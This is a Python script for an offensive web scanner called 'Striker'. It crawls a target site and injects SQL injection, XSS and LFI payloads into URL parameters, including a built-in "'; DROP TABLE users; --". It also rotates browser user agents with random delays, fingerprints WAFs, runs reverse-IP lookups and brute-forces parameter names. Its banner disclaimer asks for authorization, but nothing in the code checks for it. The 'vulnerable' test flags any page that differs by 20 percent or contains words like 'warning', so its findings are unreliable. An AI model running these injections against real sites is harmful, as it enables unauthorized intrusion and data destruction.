import requests
from bs4 import BeautifulSoup
from urllib.parse import urljoin, urlparse, parse_qs
import argparse
import os
import csv
import time
import socket
import random
from tqdm import tqdm
from difflib import SequenceMatcher
from concurrent.futures import ThreadPoolExecutor, as_completed
from colorama import Fore, Style, init

init(autoreset=True)

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:127.0) Gecko/20100101 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36 Edg/125.0.2535.51",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_5) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.5 Safari/605.1.15",
    "Mozilla/5.0 (Macintosh; ARM Mac OS X 14_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_3_1 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Mobile/15E148 Safari/604.1",
    "Mozilla/5.0 (Linux; Android 14; Pixel 8 Pro) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Mobile Safari/537.36",
    "Mozilla/5.0 (Linux; Android 14; SM-S928B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Mobile Safari/537.36 SamsungBrowser/24.0",
    "Mozilla/5.0 (Android 14; Mobile; rv:127.0) Gecko/127.0 Firefox/127.0",
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.6422.112 Safari/537.36 OPR/110.0.5168.42"
]

waf_signatures = [
    "X-Sucuri-ID", "X-Sucuri-Cloudproxy", "X-Akamai-Transformed", "X-CDN",
    "X-Frame-Options", "X-Mod-Security", "X-Powered-By-AspNet", "X-Distil-CS",
    "X-Imunify360-Block", "X-Moz", "X-Powered-By-Anquanbao", "X-Powered-By-Tencent",
    "X-Powered-By-360wzb", "X-Cache", "X-Cache-Status", "X-WAF-Detected", "X-WAF",
    "X-Powered-By", "X-Firewall", "X-Request-ID", "X-Barracuda-Proxy", "Server",
    "CF-RAY", "CDN-Loop", "X-Azure-Ref", "X-Cdn", "X-Application-Context",
    "Strict-Transport-Security"
]

waf_value_patterns = [
    "cloudflare", "sucuri", "akamai", "incapsula", "360wzb", "f5", "barracuda",
    "aws", "azure", "mod_security", "edgecast", "tencent", "anquanbao", "yunsuo",
    "netscaler", "radware", "denyall", "fortiweb", "sitelock", "wallarm",
    "dotdefender", "profense"
]

def get_headers():
    return {"User-Agent": random.choice(USER_AGENTS)}

def delay():
    time.sleep(random.uniform(0.5, 1.5))

def is_valid_url(url):
    try:
        result = urlparse(url)
        return all([result.scheme, result.netloc])
    except:
        return False

def load_payloads(path=None):
    if path and os.path.exists(path):
        with open(path, 'r', encoding='utf-8') as f:
            payloads = [line.strip() for line in f if line.strip()]
            print(f"{Fore.WHITE}[*]{Fore.YELLOW} Loaded {Fore.RED}{len(payloads)}{Fore.YELLOW} payloads from {Fore.RED}{path}{Style.RESET_ALL}")
            return payloads
    default_payloads = ["'", "' OR '1'='1", "'; DROP TABLE users; --"]
    print(f"{Fore.YELLOW}[!] Payload file not found, using default payloads ({len(default_payloads)}).{Style.RESET_ALL}")
    return default_payloads

def get_all_links(base_url):
    try:
        response = requests.get(base_url, headers=get_headers(), timeout=10)
        response.raise_for_status()
    except Exception as e:
        print(f"{Fore.RED}[!] Error downloading {base_url}: {e}{Style.RESET_ALL}")
        return []

    soup = BeautifulSoup(response.text, 'html.parser')
    links = set()
    base_netloc = urlparse(base_url).netloc

    for tag in soup.find_all('a', href=True):
        try:
            full_url = urljoin(base_url, tag['href'])
            parsed = urlparse(full_url)
            if parsed.netloc == base_netloc:
                links.add(full_url)
        except:
            continue

    return list(links)

def filter_links_with_params(links):
    filtered = [link for link in links if '?' in link]
    print(f"{Fore.WHITE}[*]{Fore.YELLOW} Links with parameters found: {Fore.RED}{len(filtered)}{Style.RESET_ALL}")
    return filtered

def is_vulnerable(injected_text, normal_text):
    if not injected_text or not normal_text:
        return False
    
    injected_text = injected_text.lower()
    normal_text = normal_text.lower()
    
    common_errors = ["sql syntax", "mysql", "you have an error", "warning", "unexpected", "xss", "<script", "unterminated", "missing"]
    if any(err in injected_text for err in common_errors):
        return True

    similarity = SequenceMatcher(None, injected_text, normal_text).ratio()
    if similarity < 0.80:
        return True

    return False

def test_single_url(link, payloads, writer=None, lock=None):
    parsed = urlparse(link)
    base = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
    params = parse_qs(parsed.query)
    normal_response = None
    vulnerable_links = []

    try:
        normal_url = requests.Request('GET', base, params=params).prepare().url
        delay()
        normal_response = requests.get(normal_url, headers=get_headers(), timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[!] Error fetching normal response for {link}: {e}{Style.RESET_ALL}")
        return vulnerable_links

    for key in params:
        for payload in payloads:
            new_params = params.copy()
            new_params[key] = payload
            try:
                injected_url = requests.Request('GET', base, params=new_params).prepare().url
                delay()
                resp_payload = requests.get(injected_url, headers=get_headers(), timeout=10)

                is_vuln = is_vulnerable(resp_payload.text, normal_response.text)

                if is_vuln:
                    if resp_payload.status_code == 404:
                        print(f"{Fore.YELLOW}[WRN 404] {injected_url} [{resp_payload.status_code}]{Style.RESET_ALL}")
                        status = "WARNING (404)"
                    else:
                        print(f"{Fore.GREEN}[INJECTABLE] {injected_url} [{resp_payload.status_code}]{Style.RESET_ALL}")
                        status = "INJECTABLE"
                        vulnerable_links.append(injected_url)
                else:
                    print(f"{Fore.RED}[NOT INJECTABLE] {injected_url} [{resp_payload.status_code}]{Style.RESET_ALL}")
                    status = "NOT INJECTABLE"

                if writer:
                    if lock:
                        lock.acquire()
                    writer.writerow([status, injected_url, time.strftime('%Y-%m-%d %H:%M:%S')])
                    if lock:
                        lock.release()

            except Exception as e:
                print(f"{Fore.WHITE}[!]{Fore.RED} Error on {injected_url}: {e}{Style.RESET_ALL}")
    
    return vulnerable_links

def prepare_csv(filename):
    try:
        f = open(filename, 'w', newline='', encoding='utf-8')
        writer = csv.writer(f)
        writer.writerow(["Status", "URL", "Timestamp"])
        return f, writer
    except Exception as e:
        print(f"{Fore.RED}[!] Error creating CSV file: {e}{Style.RESET_ALL}")
        return None, None

def detect_waf(url):
    try:
        response = requests.get(url, headers=get_headers(), timeout=10)
        headers = response.headers
        print(f"\n{Fore.WHITE}[*]{Fore.YELLOW} WAF Detection...{Style.RESET_ALL}")
        found = False

        for key, value in headers.items():
            for sig in waf_signatures:
                if sig.lower() in key.lower():
                    print(f"{Fore.WHITE}[+]{Fore.YELLOW} Header match: {key}: {value}{Style.RESET_ALL}")
                    found = True
            for pattern in waf_value_patterns:
                if pattern in value.lower():
                    print(f"{Fore.WHITE}[+]{Fore.YELLOW} Value match: {key}: {value}{Style.RESET_ALL}")
                    found = True

        if not found:
            print(f"{Fore.YELLOW}[-] No WAF detected in common headers.{Style.RESET_ALL}")

    except Exception as e:
        print(f"{Fore.RED}[!] WAF detection error: {e}{Style.RESET_ALL}")

def reverse_ip_lookup(domain):
    print("\n[REVERSE IP LOOKUP]")
    try:
        ip = socket.gethostbyname(domain)
        print(f"{Fore.WHITE}[+]{Fore.YELLOW} Domain {domain} IP: {ip}{Style.RESET_ALL}")
        url = f"https://api.hackertarget.com/reverseiplookup/?q={ip}"
        resp = requests.get(url, headers=get_headers(), timeout=10)
        if "error" in resp.text.lower():
            print(f"{Fore.RED}[!] Error from Reverse IP service: {resp.text}{Style.RESET_ALL}")
        else:
            print(f"{Fore.WHITE}[+]{Fore.YELLOW} Domains found on IP {ip}:{Style.RESET_ALL}\n{resp.text}")
    except Exception as e:
        print(f"{Fore.RED}[!] Reverse IP error: {e}{Style.RESET_ALL}")

def crawl_recursive(url, depth=3, visited=None):
    if visited is None:
        visited = set()
    if depth == 0 or url in visited:
        return visited
    try:
        response = requests.get(url, headers=get_headers(), timeout=10)
        response.raise_for_status()
        visited.add(url)
        soup = BeautifulSoup(response.text, 'html.parser')
        for tag in soup.find_all("a", href=True):
            try:
                full_url = urljoin(url, tag["href"])
                if urlparse(full_url).netloc == urlparse(url).netloc:
                    crawl_recursive(full_url, depth-1, visited)
            except:
                continue
    except:
        pass
    return visited

def forced_parameter_injection():
    target = input("Enter base URL (e.g., https://example.com/page): ").strip()
    
    if not is_valid_url(target):
        print(f"{Fore.RED}[!] Invalid URL format.{Style.RESET_ALL}")
        return
    
    if '?' in target:
        print(f"{Fore.RED}[!] URL already contains parameters. This module is for URLs without parameters.{Style.RESET_ALL}")
        return

    try:
        with open("common_params.txt", "r", encoding="utf-8") as f:
            params_list = [line.strip() for line in f if line.strip()]
    except FileNotFoundError:
        print(f"{Fore.RED}[!] common_params.txt not found! Please create the file in the script directory.{Style.RESET_ALL}")
        return

    print(f"{Fore.WHITE}[*]{Fore.YELLOW} Loaded {Fore.RED}{len(params_list)}{Fore.YELLOW} test parameters.{Style.RESET_ALL}")
    results = []

    try:
        delay()
        normal_resp = requests.get(target, headers=get_headers(), timeout=10)
    except Exception as e:
        print(f"{Fore.RED}[!] Error fetching normal response: {e}{Style.RESET_ALL}")
        return

    for param in params_list:
        test_url = f"{target}?{param}"
        try:
            delay()
            test_resp = requests.get(test_url, headers=get_headers(), timeout=10)
            if test_resp.status_code == 404:
                print(f"{Fore.YELLOW}[WRN 404] {test_url} [{test_resp.status_code}]{Style.RESET_ALL}")
                results.append(("WRN (404)", test_url, time.strftime('%Y-%m-%d %H:%M:%S')))
            elif is_vulnerable(test_resp.text, normal_resp.text):
                print(f"{Fore.GREEN}[VULNERABLE] {test_url} [{test_resp.status_code}]{Style.RESET_ALL}")
                results.append(("VULNERABLE", test_url, time.strftime('%Y-%m-%d %H:%M:%S')))
            else:
                print(f"{Fore.RED}[NOT VULNERABLE] {test_url} [{test_resp.status_code}]{Style.RESET_ALL}")
                results.append(("NOT VULNERABLE", test_url, time.strftime('%Y-%m-%d %H:%M:%S')))
        except Exception as e:
            print(f"{Fore.RED}[!] Error on {test_url}: {e}{Style.RESET_ALL}")

    with open("forced_param_results.csv", "w", newline='', encoding="utf-8") as f:
        writer = csv.writer(f)
        writer.writerow(["Status", "URL", "Timestamp"])
        writer.writerows(results)

    print(f"{Fore.WHITE}[+]{Fore.YELLOW} Bruteforce completed. Results saved in forced_param_results.csv{Style.RESET_ALL}")

def main_menu():
    while True:
        print(f"""
{Fore.YELLOW} ___{Style.RESET_ALL}
{Fore.YELLOW}__H__     {Fore.WHITE}     Advanced Vulnerability Scanner {Style.RESET_ALL}
{Fore.YELLOW} [{Fore.RED},{Fore.YELLOW}]{Style.RESET_ALL}
{Fore.YELLOW} [{Fore.RED}){Fore.YELLOW}]{Style.RESET_ALL}
{Fore.YELLOW} [{Fore.RED};{Fore.YELLOW}]  Striker{Style.RESET_ALL}
{Fore.YELLOW} |_|{Fore.RED}    ⱽ¹ˑ⁸_ˣᴰⁱⁱᵒⁱᵗˢ³ᶜ{Style.RESET_ALL}
{Fore.YELLOW}  V{Style.RESET_ALL}
{Fore.RED}[!] Disclaimer: {Fore.YELLOW}Attacking targets without prior mutual consent is illegal.{Style.RESET_ALL}
{Fore.RED}[!]{Fore.YELLOW} Use the tool only on sites you own or with explicit authorization.{Style.RESET_ALL}
{Fore.RED}[!]{Fore.YELLOW} It is the end user's responsibility to obey all applicable local, state and federal laws.{Style.RESET_ALL}
{Fore.BLUE}================{Style.RESET_ALL}
1){Fore.YELLOW} SQL{Fore.RED} Injection{Style.RESET_ALL}
2){Fore.YELLOW} XSS{Fore.RED} Injection{Style.RESET_ALL}
3){Fore.YELLOW} LFI{Fore.RED} Injection{Style.RESET_ALL}
4){Fore.YELLOW} Advanced{Style.RESET_ALL} Scan
5){Fore.YELLOW} WAF Detection{Style.RESET_ALL} &{Fore.YELLOW} Reverse IP{Style.RESET_ALL}
6){Fore.YELLOW} Crawler{Style.RESET_ALL}
7){Fore.YELLOW} Bruteforce{Fore.RED} Params{Style.RESET_ALL}
0){Fore.RED} Exit{Style.RESET_ALL}
""")
        scelta = input("Select an option: ").strip()
        
        if scelta in ["1", "2", "3", "4"]:
            target = input("Enter URL with parameter: ").strip()
            
            if not is_valid_url(target):
                print(f"{Fore.RED}[!] Invalid URL format.{Style.RESET_ALL}")
                continue
            
            links = get_all_links(target)
            links = filter_links_with_params(links)
            if not links:
                print(f"{Fore.RED}[!] No links with parameters found. Stopping scan.{Style.RESET_ALL}")
                continue
            
            if scelta == "1":
                payloads = load_payloads("sqli_payloads.txt")
            elif scelta == "2":
                payloads = load_payloads("xss_payloads.txt")
            elif scelta == "3":
                payloads = load_payloads("lfi_payloads.txt")
            else:
                path = input("Custom payload file path: ").strip()
                payloads = load_payloads(path)
            
            f, writer = prepare_csv("scan_results.csv")
            if f is None:
                continue
            
            for link in links:
                test_single_url(link, payloads, writer)
            
            f.close()
            print(f"{Fore.WHITE}[+]{Fore.YELLOW} Scan completed. Results saved in scan_results.csv{Style.RESET_ALL}")
        
        elif scelta == "5":
            target = input("Enter URL (e.g., https://example.com): ").strip()
            if not is_valid_url(target):
                print(f"{Fore.RED}[!] Invalid URL format.{Style.RESET_ALL}")
                continue
            detect_waf(target)
            reverse_ip_lookup(urlparse(target).hostname)
        
        elif scelta == "6":
            target = input("Enter the starting URL: ").strip()
            if not is_valid_url(target):
                print(f"{Fore.RED}[!] Invalid URL format.{Style.RESET_ALL}")
                continue
            print(f"{Fore.WHITE}[*]{Fore.YELLOW} Crawling at depth 3...{Style.RESET_ALL}")
            results = crawl_recursive(target, depth=3)
            with open("crawler_output.csv", "w", encoding="utf-8") as f:
                for url in sorted(results):
                    print(url)
                    f.write(url + "\n")
            print(f"{Fore.WHITE}[+]{Fore.YELLOW} Crawling completed. {len(results)} URLs found.{Style.RESET_ALL}")
            print(f"{Fore.WHITE}[+]{Fore.YELLOW} URLs saved in crawler_output.csv{Style.RESET_ALL}")
        
        elif scelta == "7":
            forced_parameter_injection()
        
        elif scelta == "0":
            print(f"{Fore.GREEN}Exiting the program.{Style.RESET_ALL}")
            break
        
        else:
            print(f"{Fore.RED}[!] Invalid option!{Style.RESET_ALL}")

if __name__ == "__main__":
    main_menu()
